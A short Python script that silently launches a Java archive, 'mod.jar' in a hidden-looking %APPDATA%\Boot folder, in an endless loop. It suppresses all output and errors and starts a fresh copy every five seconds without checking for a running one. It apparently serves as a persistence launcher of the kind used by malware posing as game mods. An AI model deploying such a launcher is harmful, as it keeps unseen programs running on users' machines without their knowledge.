import subprocess
import os
import time
import sys

if len(sys.argv) > 1:
    java_path = sys.argv[1]
else:
    java_path = "java"  # visszaesés, ha nincs argumentum

JAR_PATH = os.path.join(os.getenv("APPDATA"), "Boot", "mod.jar")

while True:
    try:
        subprocess.Popen([java_path, "-jar", JAR_PATH],
                         cwd=os.path.dirname(JAR_PATH),
                         stdout=subprocess.DEVNULL,
                         stderr=subprocess.DEVNULL)
    except:
        pass
    time.sleep(5)
